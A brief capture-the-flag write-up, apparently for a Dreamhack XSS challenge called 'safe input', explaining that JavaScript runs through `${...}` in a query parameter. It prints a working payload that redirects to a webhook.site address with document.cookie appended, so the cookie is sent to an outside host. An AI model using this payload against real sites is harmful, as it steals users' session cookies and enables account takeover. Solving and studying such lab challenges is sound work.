# safe input
This challenge involves simple xss

## Solve
We can execute javascript using `${...}`
```
http://chall.site/test?text=${location.href='https://webhook.site/161026e8-ae75-4780-a5be-ed5221f0ff61/?flag='+document.cookie}
```

Report this and get the flag on our webhook:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/15599333ec82cba441945bb339142dff6368ecb467bd899bfe020bcdebf08c56.png)
